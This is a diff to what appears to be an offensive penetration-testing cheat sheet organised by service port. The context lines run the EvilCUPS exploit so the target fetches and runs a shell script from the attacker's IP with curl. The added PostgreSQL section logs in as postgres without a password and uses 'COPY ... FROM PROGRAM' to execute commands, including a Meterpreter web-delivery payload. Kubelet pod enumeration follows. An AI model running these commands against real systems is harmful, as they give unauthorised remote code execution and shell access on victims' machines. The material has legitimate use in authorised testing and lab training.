@@ -735,6 +735,16 @@ evilcups.py $MYIP $TARGET 'bash -c "curl $MYIP:53/resh|sh"'
 https://$TARGET:631/printers
 Pwned_Printer > Print Test Page
 
+[*] (5432) Postgres
+locate psql
+/usr/local/pgsql/bin/psql -U postgres -w
+\du
+\list
+CREATE TABLE shell(output text);
+TRUNCATE shell
+COPY shell FROM PROGRAM 'id'; SELECT * FROM shell;
+COPY shell FROM PROGRAM 'MSF_Linux_Meterpreter_Web_Delivery'
+
 [*] (10249-10250) Kubelet
 +---------- View Pods ----------+
 kubeletctl -s $TARGET pods
